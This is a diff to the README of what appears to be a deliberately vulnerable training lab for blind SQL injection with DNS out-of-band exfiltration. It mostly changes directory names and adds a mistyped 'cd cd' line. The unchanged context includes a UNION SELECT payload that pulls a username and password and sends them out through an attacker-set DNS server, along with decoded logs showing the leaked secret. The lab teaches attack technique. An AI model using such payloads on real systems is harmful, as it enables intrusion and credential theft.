@@ -22,6 +22,7 @@ This lab simulates a vulnerable web application that is susceptible to blind SQL
 ### Clone this repo
 
 	git clone https://github.com/zinzloun/blindSQLi-DNS-OOB.git
+ 	cd cd blindSQLi-DNS-OOB
 
 ### Run containers
 
@@ -80,7 +81,7 @@ Indeed check logged queries on our DSN container
  Decode the raw query:
 
  	root@004315a2105c:/app# exit
-	[~/blind-sqli-lab] python decode-raw-dnsq.py 942b010000010000000000000377777706676f6f676c650269740000010001        
+	[~/blindSQLi-DNS-OOB] python decode-raw-dnsq.py 942b010000010000000000000377777706676f6f676c650269740000010001        
 	[+] Plain domain value: www.google.it
 
 ## 💥Exploitation 
@@ -89,7 +90,7 @@ Knowing tha we can control the DNS parameter for nslookup and assuming that a us
 	/search?set-dns=172.20.53.53&id=1 UNION SELECT (SELECT username || '-' || password FROM users WHERE id=1)
  Check again the logged query
 
- 	[~/blind-sqli-lab] sudo docker exec -it blind-sqli-lab_dns-server_1 /bin/bash                              
+ 	[~/blindSQLi-DNS-OOB] sudo docker exec -it blind-sqli-lab_dns-server_1 /bin/bash                              
 	root@004315a2105c:/app# cat dns_log.txt 
 	2025-07-09 08:38:12,913 - DNS query from ('172.20.53.10', 41104): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
 	2025-07-09 08:38:17,917 - DNS query from ('172.20.53.10', 41908): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
@@ -101,7 +102,7 @@ Knowing tha we can control the DNS parameter for nslookup and assuming that a us
 Decode the last entries
 
  	root@004315a2105c:/app# exit
-  	[~/blind-sqli-lab] python decode-raw-dnsq.py 697e010000010000000000001161646d696e2d73757065727365637265740000010001                                                             
+  	[~/blindSQLi-DNS-OOB] python decode-raw-dnsq.py 697e010000010000000000001161646d696e2d73757065727365637265740000010001                                                             
 	[+] Plain domain value: admin-supersecret
 
 ## ❓ Why this Lab?
